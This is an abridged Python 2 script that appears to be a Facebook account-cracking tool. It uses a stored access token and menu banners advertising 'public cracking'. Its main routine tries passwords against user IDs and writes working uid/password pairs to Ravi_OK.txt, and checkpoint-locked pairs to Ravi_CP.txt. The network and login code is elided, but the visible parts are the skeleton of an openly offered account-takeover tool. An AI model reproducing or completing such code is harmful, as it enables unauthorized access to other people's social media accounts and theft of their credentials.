...
def menu():
    ...
    os.system('clear')
    print logo
    tok = open('/sdcard/.Ravi.txt', 'r').read()
    ...
    print '\x1b[1;92m[6] Youtube KUMARI TRICKER'
    menu_s()
...
def a_s():
    ...
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Ravi Kumar public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                ok = open('/sdcard/ids/Ravi_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[OHH-CP] ' + uid + ' | ' + pass1
                cp = open('Ravi_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mNISHA QUEEN Of Fcebook\x1b[1;91m'
    print 47 * '-'
